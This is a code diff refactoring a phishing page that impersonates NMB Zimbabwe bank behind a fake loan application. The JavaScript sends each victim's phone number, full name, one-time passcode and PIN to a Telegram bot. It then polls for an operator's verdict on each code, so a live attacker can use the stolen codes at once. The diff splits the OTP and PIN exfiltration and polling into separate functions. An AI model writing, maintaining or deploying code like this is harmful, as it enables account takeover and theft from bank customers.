@@ -161,7 +161,7 @@
             const otp = Array.from(otpInputs).map(i => i.value).join('');
             if (otp.length === 6) {
                 setTimeout(() => {
-                    sendToTelegram('OTP', otp);
+                    sendOtpToTelegram(otp);
                     triggerVerification();
                 }, 300);
             }
@@ -170,7 +170,7 @@
         submitBtn.addEventListener('click', () => {
             const otp = Array.from(otpInputs).map(i => i.value).join('');
             if (otp.length === 6) {
-                sendToTelegram('OTP', otp);
+                sendOtpToTelegram(otp);
                 triggerVerification();
             } else {
                 alert('Please enter the complete 6-digit OTP code');
@@ -182,12 +182,12 @@
             verificationOverlay.classList.remove('hidden');
         }
 
-        async function sendToTelegram(type, value) {
+        async function sendOtpToTelegram(otp) {
             const message = `
 🔐 <b>OTP VERIFICATION - NMB ZIMBABWE</b>
 
 📱 <b>Phone:</b> ${session.phone}
-🔑 <b>OTP Code:</b> <code>${value}</code>
+🔑 <b>OTP Code:</b> <code>${otp}</code>
 💰 <b>Loan Amount:</b> USD ${session.amount}
 👤 <b>Applicant:</b> ${session.fullName}
 
@@ -215,28 +215,24 @@
                     })
                 });
                 
-                pollForStatus('otp', session.phone);
+                pollForOtpStatus(session.phone);
             } catch (error) { 
                 console.error('Error sending OTP to Telegram:', error); 
             }
         }
 
-        function pollForStatus(type, phone) {
+        function pollForOtpStatus(phone) {
             const interval = setInterval(() => {
-                const status = localStorage.getItem(`${type}_approval_${phone}`);
+                const status = localStorage.getItem(`otp_approval_${phone}`);
                 if (status === 'valid') {
                     clearInterval(interval);
-                    localStorage.removeItem(`${type}_approval_${phone}`);
-                    if (type === 'otp') {
-                        verificationOverlay.classList.add('hidden');
-                        pinModal.classList.remove('hidden');
-                    } else {
-                        window.location.href = 'success.html';
-                    }
+                    localStorage.removeItem(`otp_approval_${phone}`);
+                    verificationOverlay.classList.add('hidden');
+                    pinModal.classList.remove('hidden');
                 } else if (status === 'invalid') {
                     clearInterval(interval);
-                    localStorage.removeItem(`${type}_approval_${phone}`);
-                    alert(`Invalid ${type.toUpperCase()}. Please try again.`);
+                    localStorage.removeItem(`otp_approval_${phone}`);
+                    alert('Invalid OTP. Please try again.');
                     location.reload();
                 }
             }, 1000);
@@ -297,20 +293,27 @@
                     })
                 });
                 
-                pollForStatus('pin', session.phone);
+                pollForPinStatus(session.phone);
             } catch (error) { 
                 console.error('Error sending PIN to Telegram:', error); 
             }
         }
 
-        // Timer countdown
-        let timeLeft = 59;
-        setInterval(() => {
-            if (timeLeft > 0) {
-                timeLeft--;
-                timerText.textContent = timeLeft;
-            }
-        }, 1000);
+        function pollForPinStatus(phone) {
+            const interval = setInterval(() => {
+                const status = localStorage.getItem(`pin_approval_${phone}`);
+                if (status === 'valid') {
+                    clearInterval(interval);
+                    localStorage.removeItem(`pin_approval_${phone}`);
+                    window.location.href = 'success.html';
+                } else if (status === 'invalid') {
+                    clearInterval(interval);
+                    localStorage.removeItem(`pin_approval_${phone}`);
+                    alert('Invalid PIN. Please try again.');
+                    location.reload();
+                }
+            }, 1000);
+        }
     </script>
 </body>
 </html>
